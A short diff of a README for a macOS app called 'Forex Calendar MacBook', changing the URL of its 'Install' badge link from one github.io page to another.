@@ -3,7 +3,7 @@
 
 Forex Calendar MacBook is a financial market tool for macOS. Track global economic events, news releases, and market-moving data in real time. 📊💱
 
-[![📊 Install Forex Calendar MacBook](https://img.shields.io/badge/Install%20Forex%20Calendar%20MacBook-004d99?style=for-the-badge&logo=apple&logoColor=white)](https://icepower2001.github.io/.github/forexcalendar-macbook)
+[![📊 Install Forex Calendar MacBook](https://img.shields.io/badge/Install%20Forex%20Calendar%20MacBook-004d99?style=for-the-badge&logo=apple&logoColor=white)](https://icepower2001-bit.github.io/.github/forexcalendar-macbook)
 
 ---
 
